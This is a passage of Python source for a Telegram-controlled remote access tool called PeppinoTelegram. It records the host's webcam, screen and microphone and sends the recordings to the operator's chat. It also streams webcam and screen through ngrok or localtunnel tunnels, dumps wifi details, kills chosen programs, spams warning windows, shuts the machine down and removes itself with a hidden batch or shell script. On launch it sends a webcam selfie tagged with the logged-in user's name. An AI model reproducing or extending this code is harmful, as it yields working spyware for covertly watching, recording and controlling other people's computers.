    # This code is like an impressive skycraper held by a little wire.

    def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
        capture_duration = int(capture_duration)
        bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
        try:
            filename = join(BURN_DIRECTORY, randomname()+".mp4")
            audio_filename = join(BURN_DIRECTORY, randomname()+".wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            self.opencap()
            webcam = self.cap
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(capture_duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0 
            while int(time_elapsed) < capture_duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    return
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                _, frame = webcam.read()
                fr_height, fr_width, _ = frame.shape
                frame = resize(frame, (fr_width//2, fr_height//2))
                fr_height, fr_width, _ = frame.shape
                img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                out.write(img)
            bar.set100()
            sd.wait()
            out.release()
            self.closecap()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")      #this was torture
            video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            e = traceback.format_exc()
            self.bsend(f"Error while sending video clip\n{e}")
        bar.fill_and_delete()

    def removefromcantopen(self, process: str) -> None:
        self.cantopenmenu_ref.delete()
        self.cantopenlist.remove(process)
        self.cantopenmenu()
        self.bsend(f"🔒 Removed {process} to cantopenlist.")

    def restore_wallpaper(self) -> None:
        if self.backup_wallpaper_path:
            self.bsend("Wallpaper backup was not created so restoring it is not currently possible.")
            return
        change_wallpaper(self.backup_wallpaper_path)

    def rightclick(self) -> None:
        pg.rightClick() #no shit

    def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
        try:
            images = self.fastscreenshot()
            for image in images:
                remove(image)
        except Exception as e:
            return self.bsend(f"Error while getting screenshot\n{e}")

    def screenshotandselfie(self) -> None:
        self.opencap()
        for scrt in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png")):
            name = randompngname()
            ret, image = screen_and_webcam_pic(self.cap, scrt)
            if not ret: continue
            
            self.__send_image(image_buf=cv2_to_bytesio(image))
            try:
                remove(name)
            except:
                ...
        self.closecap()

    def selfie(self, caption: str|None=None, reply_markup=None) -> None:
        try:
            filename = join(BURN_DIRECTORY,randompngname())
            self.opencap()
            camera = self.cap
            return_value, image = camera.read()
            if not return_value:
                raise Exception("Could not find camera")
            imwrite(filename, image)
            response = self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption, reply_markup=reply_markup)
            self.all_session_messages.append(response["message_id"])
            remove(filename)
            self.closecap()
            return True
        except Exception as e:
            self.bsend(f"Something has happened while getting webcam\n {e}")
            return False

    def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
        message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
        filename = randomname()+".wav"
        filepath = join(BURN_DIRECTORY, filename)
        res = self.record_audio(filepath, seconds)
        if isinstance(res, Exception):
            err = f"Error while recording audio: {res}"
            self.bsend(err)
        else:
            message.edit("Done recording, sending...")
            filepath = wav_to_ogg(filepath, rmold=True)
            with open(filepath, "rb") as fi:
                self.bot.sendVoice(self.owner_id, fi, caption=caption)
            remove(filepath)
            message.delete()

    def confirmContuinuingWithoutWallpaperBackup(self):
        if not self.backup_wallpaper_path:
            return self.ask_yesno("The program was unable to backup the wallpaper, do you still want to use this functionality Y/n")
        else:
            return True

    def connectioncheckerloop(self):
        while self.running:
            self.connected = check_connection()
            sleep(15 if self.connected else 5)


    def setCameraAsWallpaper(self, seconds: float|int=5):
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        seconds = int(seconds)
        loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
        filename = join(BURN_DIRECTORY, "jxframe.png")
        start = time()
        res = True
        self.opencap()
        while time()-start <= seconds and res:
            if loading_bar.canceled:
                break
            loading_bar.update(time()-start)
            res, frame = self.cap.read()
            frame = pad_to_16_9(frame)
            imwrite(filename, frame)
            change_wallpaper(filename)
        loading_bar.set100()
        self.closecap()
        sleep(1)
        try:
            remove(filename)
        except FileNotFoundError:
            ...
        loading_bar.delete()
        self.restore_wallpaper()

    def set_volume(self, volume):
        if volume in range(0, 101):
            self.audio_mixer.setVolumePercentage(volume)
        else:
            self.bsend(f"Volume must be from 0.0 to 100.0")

    def setvideowallpaper(self, videofilename: str) -> None:
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        res = True
        filename = join(BURN_DIRECTORY, "jxframe.png")
        backup_filename = join(BURN_DIRECTORY, "backup.png")
        self.opencap()
        video = VideoCapture(abspath(videofilename))
        while res:
            res, frame = video.read()
            imwrite(frame)
            change_wallpaper(filename)
        change_wallpaper(backup_filename)
        remove(filename)
        remove(backup_filename)
        self.closecap()
        self.restore_wallpaper()

    def selfdestruction(self) -> None:
        if not self.ask_yesno():
            self.bsend("Operation stopped.")
            return
        current_file = realpath(sys.argv[0])
        temp_dir = gettempdir()
        if iswindows:
            bat_file = join(temp_dir, "delete_me.bat")
            with open(bat_file, "w") as f:
                f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
            Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
        else:
            sh_file = join(temp_dir, "delete_me.sh")
            with open(sh_file, "w") as f:
                f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                # :(
            chmod(sh_file, 0o700)
            Popen(['sh', sh_file]) 
        self.bsend(f"🛑 Removing executable.")
        self.stop()

    def show_image(self, image_path: str) -> None:
        try:
            imshow("Warning", resize(imread(image_path), (400, 400)))
            setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
            waitKey(0)
            destroyWindow("Warning")
            remove(image_path)
        except Exception as e:
            self.bsend(f"Error while trying to show image: \n{e}")

    def shutdown(self, seconds=0) -> None:
        if not self.ask_yesno():
            self.bsend("Operation stopped.")
            return
        system(f"shutdown -s -t {seconds}")

    def spam_windows(self, n: int, text: str) -> None:
        for i in range(n):
            sp_win = Thread(target=self.message_box, args=["Warning", text,])
            sp_win.start()
    
    def stop_webcam_and_screen_tunnel(self, verbose=True) -> None:
        if self.webcam_and_screen_url:
            self.tunnelhandler.stop_service("webcamandscreen")
            self.webcam_and_screen_url = None
            if verbose:
                self.bsend(f"📸🖥️ Webcam & Screen tunnel closed")
            return
        if verbose:
            self.bsend(f"📸🖥️ You have no Webcam & Screen tunnel opened")

    def stop_webcam_tunnel(self, verbose=True) -> None:
        if self.webcam_url:
            self.closecap()
            self.tunnelhandler.stop_service("webcam")
            self.webcam_url = None
            if verbose:
                self.bsend(f"📸 Webcam tunnel closed")
            return
        if verbose:
            self.bsend(f"📸 You have no Webcam tunnel opened")

    def stop_screen_tunnel(self, verbose=True) -> None:
        if self.screen_url:
            self.tunnelhandler.stop_service("screen")
            self.screen_url = None
            if verbose:
                self.bsend(f"🖥️ Screen tunnel closed")
            return
        if verbose:
            self.bsend(f"🖥️ You have no Screen tunnel opened")

    def stop_all_tunnels(self) -> None:
        e = self.new_editable_message("Closing all tunnels..")
        self.stop_screen_tunnel(False)
        self.stop_webcam_and_screen_tunnel(False)
        self.stop_webcam_tunnel(False)
        e.edit("Done.")
        e.delete()

    def start_webcam_and_screen_tunnel(self) -> None:
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.webcam_and_screen_url is None:
                self.webcam_and_screen_url, password = self.tunnelhandler.start_webcam_and_screen_stream(
                    cap=self.cap
                )
                warning = generate_warning_for_url(self.webcam_and_screen_url)
                url_md = escape_md(self.webcam_and_screen_url)
                self.bsendWithMarkdownV2(
                    f"📸🖥️ *Webcam & Screen Tunnel Started*\n"
                    f"URL: [{url_md}]({url_md})\n"
                    f"Password: `{password}`\n"
                    f"Warning: `{warning}`"
                )
            else:
                url_md = escape_md(self.webcam_and_screen_url)
                self.bsendWithMarkdownV2(
                    f"📸🖥️ *Webcam & Screen Tunnel Already Running*\n"
                    f"URL: [{url_md}]({url_md})"
                )
        else:
            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def start_webcam_tunnel(self) -> None:
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.webcam_url is None:
                self.webcam_url, password = self.tunnelhandler.start_webcam_stream(cap=self.cap)
                warning = generate_warning_for_url(self.webcam_url)
                url_md = escape_md(self.webcam_url)
                self.bsendWithMarkdownV2(
                    f"📸 *Webcam Tunnel Started*\n"
                    f"URL: [{url_md}]({url_md})\n"
                    f"Password: `{password}`\n"
                    f"Warning: `{warning}`"
                )
            else:
                url_md = escape_md(self.webcam_url)
                self.bsendWithMarkdownV2(
                    f"📸 *Webcam Tunnel Already Running*\n"
                    f"URL: [{url_md}]({url_md})"
                )
        else:
            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def start_screen_tunnel(self) -> None:
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.screen_url is None:
                self.screen_url, password = self.tunnelhandler.start_screen_stream()
                warning = generate_warning_for_url(self.screen_url)
                url_md = escape_md(self.screen_url)
                self.bsendWithMarkdownV2(
                    f"🖥️ *Screen Tunnel Started*\n"
                    f"URL: [{url_md}]({url_md})\n"
                    f"Password: `{password}`\n"
                    f"Warning: `{warning}`"
                )
            else:
                url_md = escape_md(self.screen_url)
                self.bsendWithMarkdownV2(
                    f"🖥️ *Screen Tunnel Already Running*\n"
                    f"URL: [{url_md}]({url_md})"
                )
        else:
            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def send_prompt(self, question: str) -> str:
        self.bsend(question)
        self.user["status"]="input_requested"
        self.user["last_response"]=None
        while not self.user["last_response"]:
            sleep(1)
        else:
            tmp = self.user["last_response"]
            self.user["last_response"]=None
            self.user["status"] = None
            return tmp

    def start(self) -> None:
        STARTING_LOG_MESSAGE = self.new_editable_message("STARTING")
        #Getting rid of old shi
        try:
            self.bot.deleteWebhook()
        except MaxRetryError:
            #don't care
            ...
        STARTING_LOG_MESSAGE.edit("DELETED WEBHOOK")

        self.bot.getUpdates()
        STARTING_LOG_MESSAGE.edit("GOT UPDATES")

        self.images = load_images()
        STARTING_LOG_MESSAGE.edit("GOT IMAGES")

        self.update_commands()
        STARTING_LOG_MESSAGE.edit("GOT COMMANDS")

        nomemes = list(self.images.copy().keys())
        self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))

        self.audios = load_audios()
        STARTING_LOG_MESSAGE.edit("AUDIOS LOADED")

        curr_wallpaper_path = get_current_wallpaper()
        if curr_wallpaper_path:
            self.backup_wallpaper_path = join(BURN_DIRECTORY, curr_wallpaper_path)
        else:
            self.backup_wallpaper_path = None
        STARTING_LOG_MESSAGE.edit("WALLPAPER BACKED UP")

        self.cantopenthread = Thread(target=self.cantopenkiller)
        self.cantopenthread.start()
        STARTING_LOG_MESSAGE.edit("PROGRAM KILLER STARTED")

        self.processmonthread = Thread(target=self.processmonitorloop)
        self.processmonthread.start()
        STARTING_LOG_MESSAGE.edit("PROCESS MONITOR STARTED")

        self.connectioncheckerthread = Thread(target=self.connectioncheckerloop)
        self.connectioncheckerthread.start()

        self.screen_width, self.screen_height = pg.size()
        STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
        botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
        if not sys.argv[1:]:
            if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
                self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
        else:
            self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())

        #cleanup update
        self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
        loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
        loop.run_as_thread()
        STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
        STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
        while self.running:
            try:
                sleep(10)
            except KeyboardInterrupt:
                self.bsend("🛑 Interrupted by host machine, bye bye.")
                self.running = False

    def stop(self) -> None:
        if self.ask_yesno():
            self.running = False
            self.clear()
            self.bsend("🛑 Interrupted by you, bye bye.")
            self.stop_all_tunnels()
            sys.exit()
        else:
            self.bsend("Operation stopped.")

    def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
        ...

    def update_commands(self) -> bool:
        commands = self.extract_commands()
        url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
        payload = {'commands': commands}
        response = requests.post(url, json=payload)
        return response.status_code == 200

    def waitforface(self, timeout=60):
        start = time()
        self.opencap()
        cap = self.cap
        while time()-start < timeout:
            res, frame = detect_face(cap)
            if frame is None:
                self.bsend("Face recognition model not loaded properly.")
                break
            if res:
                filename = randompngname()
                imwrite(filename, frame)
                self.__send_image(filename)
                remove(filename)
                break
        self.closecap()

    def wifiinfo(self) -> None:
        self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")

    def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
        Thread(target=self.overlay_opencv.run(timeout_seconds)).start()

    def disturbed_overlay_and_random_noise(self, duration: int) -> None:
        self.wrapper_for_hdmi_overlay(duration)
        t2 = Thread(target=play_random_noise, args=(duration,))
        t2.start()
        t2.join()

"""
ooo        ooooo            o8o
`88.       .888'            `"'
 888b     d'888   .oooo.   oooo  ooo. .oo.   
 8 Y88. .P  888  `P  )88b  `888  `888P"Y88b  
 8  `888'   888   .oP"888   888   888   888  
 8    Y     888  d8(  888   888   888   888  
o8o        o888o `Y888""8o o888o o888o o888o 
"""

if __name__ == "__main__":
    try:
        token, chat_id, ngrok_token, tunnel_provider = getCred() 
    except Exception as e:
        with open(join(gettempdir(), "PEP2log.log"), "w") as fo:
            fo.write(traceback.format_exc())
            fo.write(str(e))
    mixer = CustomMixer()
    capture = VideoCapture(0)
    signal_error = ""
    if tunnel_provider == "ngrok":
        try:
            pyngrok.process.subprocess.Popen = _patched_popen
            try:
                if ngrok_token.strip():
                    terminate_process_by_name("ngrok.exe")
                    ngrok.set_auth_token(ngrok_token)
                    close_all_tunnels(ngrok)
            except pyngrok.exception.PyngrokNgrokError as e:
                    sleep(2)
                    terminate_process_by_name("ngrok.exe")
                    signal_error += f"Ngrok Error: {e}\n"
                    ngrok_token = None
        except Exception as e:
            signal_error += f"Unhandled exception: {e}\n"

    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel")
    if GENERATE_COMMANDS_MD:
        try:
            import update_commandsMD
            update_commandsMD.main(pep2)
        except ImportError:
            pass
        sys.exit(0)
    # I wanted to make this multiple user but the code has become too hard to maintain.
    pep2.start()
